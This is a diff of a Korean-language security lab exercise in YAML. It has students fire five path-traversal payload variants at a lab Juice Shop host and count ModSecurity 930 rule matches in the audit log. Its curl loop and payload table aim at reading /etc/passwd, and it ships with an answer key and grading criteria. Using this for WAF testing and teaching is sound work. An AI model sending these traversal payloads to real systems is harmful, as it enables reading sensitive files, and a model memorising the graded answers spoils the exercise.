@@ -14,61 +14,114 @@ steps:
 
   - order: 1
     instruction: |
-      ## 🎯 MISSION
+      ## Mission
+      attacker 에서 **Path Traversal 5 변형** payload 를 juice.6v6.lab 으로 보내어
+      ModSec **930 (LFI)** family 의 차단 매트릭스를 작성하라. 본 step 은 *OWASP A03
+      Injection* 의 *path traversal 카테고리* + *CWE-22* + *MITRE T1083 (File and
+      Directory Discovery)*. 학생은 *5 인코딩 우회 기법* + *ModSec 930 룰* + *CRS
+      paranoia level* 3 핵심 인지.
 
-      Path Traversal **5 변형** 시도 + 응답 매트릭스.
+      ## Path Traversal 5 변형 (외워야 함)
+      | # | payload | 우회 기법 |
+      |:-:|---------|----------|
+      | 1 | `../../../etc/passwd` | 평문 — 가장 단순. ModSec 즉시 차단 |
+      | 2 | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` | URL encoding (..= %2e%2e, /= %2f) |
+      | 3 | `....//....//....//etc/passwd` | double-dot — 일부 라이브러리 의 일치 회피 |
+      | 4 | `../etc/passwd%00.jpg` | null byte (%00) — C 문자열 종료 우회 |
+      | 5 | `..%c0%afetc%c0%afpasswd` | UTF-8 overlong (%c0%af = /) — Unicode 우회 |
 
-      ## 💻 실행 명령
+      ## ModSec 930 family (LFI/Path Traversal)
+      | 룰 ID 범위 | 의미 |
+      |-----------|------|
+      | 930100 | LFI 일반 패턴 |
+      | 930110 | OS file 경로 (/etc/passwd, /windows/system32) |
+      | 930120 | RFI (Remote File Inclusion) |
+      | 930130 | NoCode bypass |
 
+      ## 실행 명령
       ```bash
       ssh 6v6-attacker '
-      for p in "../../../etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "....//....//....//etc/passwd" "../etc/passwd%00.jpg" "..%c0%afetc%c0%afpasswd"; do
-        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=$p")
-        echo "$code | $p"
-      done
+        BEFORE=$(ssh 6v6-web "sudo grep -c 930 /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+        echo "930 before: $BEFORE"
+        for p in "../../../etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "....//....//....//etc/passwd" "../etc/passwd%00.jpg" "..%c0%afetc%c0%afpasswd"; do
+          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=$p")
+          echo "  $code | $p"
+        done
+        sleep 2
+        AFTER=$(ssh 6v6-web "sudo grep -c 930 /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+        echo "930 after:  $AFTER"
+        echo "차단: $((AFTER - BEFORE))"
       '
       ```
 
-      ## 📋 확인 사항
+      ## 성공 판정
+      - 5 변형 모두 **403** 응답
+      - ModSec 930 카운트 *after > before* (차단 흔적)
+      - 5 인코딩 기법의 *각각 의미* 명시 (평문 / URL encode / double-dot / null byte / UTF-8 overlong)
+      - 403 인데 930 매치 없음 시 *어떤 룰* 차단인지 확인 (다른 family 매칭 가능)
 
-      - 5 변형 모두 403 (ModSec 930 LFI 차단)
-      - URL encoding / double-dot / null byte / UTF-8 overlong 모두 차단
+      ## 비정상 시 대응
+      - **일부 변형 200** — paranoia level 1 의 한계 (UTF-8 overlong 일부 통과 가능). paranoia 2 상승 권장
+      - **모든 응답 200** — ModSec 비활성 또는 930 룰 disabled
+      - **timeout** — fw 또는 ips drop. 인프라 점검
 
-      ## 💡 왜 이걸 하는가?
+      ## 학습 — CRS paranoia level
+      ```
+      paranoia 1 (default): 기본 차단 + 적은 false positive
+      paranoia 2: 추가 차단 + 일부 false positive
+      paranoia 3~4: 엄격 + 다수 false positive — production 비추
+      ```
 
-      OWASP A03 Injection 의 path traversal 카테고리. CRS 930 룰셋이 5 변형 모두 차단.
+    hint: |
+      5 변형 + 930 before/after 측정. 일부 변형 200 = paranoia 한계. 모든 200 =
+      ModSec 비활성.
 
-      ## 🔍 결과 해석
-
-      - **정상**: 5 × 403
-      - **W10 학습**: 일부 변형은 paranoia 1 우회 가능 (paranoia 2 상승 권장)
-    hint: 5 path traversal 변형
     category: exploit
     points: 25
     answer: |
       ssh 6v6-attacker '
-      for p in "../../../etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "....//....//....//etc/passwd" "../etc/passwd%00.jpg" "..%c0%afetc%c0%afpasswd"; do
-        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=$p")
-        echo "$code | $p"
-      done
+        BEFORE=$(ssh 6v6-web "sudo grep -c 930 /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+        for p in "../../../etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" "....//....//....//etc/passwd" "../etc/passwd%00.jpg" "..%c0%afetc%c0%afpasswd"; do
+          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=$p")
+          echo "  $code | $p"
+        done
+        sleep 2
+        AFTER=$(ssh 6v6-web "sudo grep -c 930 /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+        echo "차단: $((AFTER - BEFORE))"
       '
-    answer_detail: 5 변형 → 403.
+    answer_detail: |
+      5 Path Traversal 변형 → ModSec 930 차단 카운트. 5 × 403 + 차단 ≥ 5 = 정상.
+      일부 200 = paranoia 한계 (UTF-8 overlong 등). 모든 200 = ModSec 비활성.
     verify:
       type: output_contains
       expect: '403'
       field: stdout
       semantic:
-        intent: "Path Traversal 5 변형"
-        success_criteria: ["5 × 403"]
+        intent: |
+          Path Traversal 5 변형 (평문/URL encode/double-dot/null byte/UTF-8 overlong)
+          → ModSec 930 family 차단 매트릭스. 인코딩 우회 기법 + CRS paranoia level
+          인지. OWASP A03 + CWE-22 + MITRE T1083.
+        success_criteria:
+          - "5 변형 모두 403 응답 (paranoia 한계 시 일부 200)"
+          - "ModSec 930 카운트 after > before"
+          - "5 인코딩 기법의 각 의미 명시"
+          - "paranoia level 의 영향 인지"
+          - "200 발생 시 어떤 변형이 통과했는지 명시"
         acceptable_methods:
-          - "**[OSS] ../../../etc/passwd**"
-          - "**[OSS] URL encoding %2e%2e%2f**"
-          - "**[OSS] double-dot ....//**"
-          - "**[OSS] null byte %00**"
-          - "**[OSS] UTF-8 overlong %c0%af**"
-          - "**[OSS] ModSec 930 LFI 차단**"
-          - "**[OSS] CWE-22 Path Traversal**"
-          - "**[OSS] T1083 File and Directory Discovery**"
+          - "curl 5 변형 loop (수기 baseline): for/curl/code 측정."
+          - "ffuf -w wordlist (자동화): SecLists/Fuzzing/LFI/LFI-jhaddix.txt."
+          - "wfuzz: 비슷한 자동화."
+          - "DotDotPwn (전용 도구): `dotdotpwn -m http -h URL -O`."
+          - "ModSec audit log grep: `grep -E '930[0-9]+' audit.log`."
+          - "CRS paranoia 상승 (방어 측 시연): /etc/apache2/conf-available/security2.conf."
+          - "Burp Intruder + payload (SecLists)."
+          - "Bastion AI 자동 + KG: bastion 이 (1) 5 변형 (2) 930 카운트 (3) 200 시 finding."
+        negative_signs:
+          - "5 변형 중 일부만"
+          - "응답 코드만 보고 930 카운트 안 봄"
+          - "200 발생 시 *원인* (paranoia 한계) 인지 못함"
+          - "5 인코딩 기법 의미 모름"
+          - "paranoia level 영향 모름"
     target_vm: attacker
 
   - order: 2
